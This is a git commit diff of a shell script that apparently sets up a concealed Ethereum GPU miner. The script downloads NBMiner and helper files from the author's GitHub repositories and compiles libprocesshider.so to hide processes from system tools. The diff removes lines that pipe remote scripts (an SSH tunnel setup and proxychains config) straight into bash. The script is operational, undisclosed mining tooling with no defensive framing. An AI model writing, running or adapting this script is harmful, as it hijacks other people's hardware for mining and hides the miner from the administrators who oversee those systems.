f3953570dcb98ee6e5faef4347381d34c16a9ea2
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-06 08:46:08 +0200

    Update start_nbEtherm.sh

--- start_nbEtherm.sh
+++ start_nbEtherm.sh
@@ -1,13 +1,10 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
-sleep .1
-proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
+wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
 tar -xvzf NBMiner_36.1_Linux.tgz
 cd NBMiner_Linux
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermine.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermine.sh
 chmod +x nbEthermine.sh
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
